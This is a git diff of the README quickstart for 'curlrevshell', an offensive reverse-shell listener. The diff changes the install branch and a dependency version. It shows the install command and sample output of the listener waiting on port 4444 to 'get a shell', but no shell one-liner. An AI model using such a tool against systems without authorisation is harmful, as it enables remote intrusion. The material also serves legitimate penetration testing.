@@ -22,7 +22,7 @@ Quickstart
 1. Install the Go compiler (https://go.dev/doc/install).
 2. Install `curlrevshell` and start it.
    ```sh
-   go install github.com/magisterquis/curlrevshell@dev
+   go install github.com/magisterquis/curlrevshell@fixtemplatetests
    curlrevshell
    ```
 3. Get a shell, using one of the lines under `To get a shell:`.
@@ -33,16 +33,16 @@ Example
 -------
 It should look like the following, but with nicer colors:
 ```
-$ go install github.com/magisterquis/curlrevshell@dev
+$ go install github.com/magisterquis/curlrevshell@fixtemplatetests
 go: downloading github.com/magisterquis/goxterm v0.0.1-beta.4
-go: downloading golang.org/x/exp v0.0.0-20251009144603-d2f985daa21b
+go: downloading golang.org/x/exp v0.0.0-20251023183803-a4bb9ffd2546
 go: downloading golang.org/x/net v0.46.0
 go: downloading golang.org/x/sync v0.17.0
 go: downloading golang.org/x/sys v0.37.0
 go: downloading golang.org/x/text v0.30.0
 go: downloading golang.org/x/tools v0.38.0
 $ curlrevshell
-01:04:42.758 Welcome to curlrevshell version v0.0.1-beta.7.0.20251004180818-66c8dc187a22 (dev branch)
+01:04:42.758 Welcome to curlrevshell version v0.0.1-beta.7.0.20251004180818-66c8dc187a22 (fixtemplatetests branch)
 01:04:42.760 Listening on 0.0.0.0:4444
 01:04:42.760 To get a shell:
 
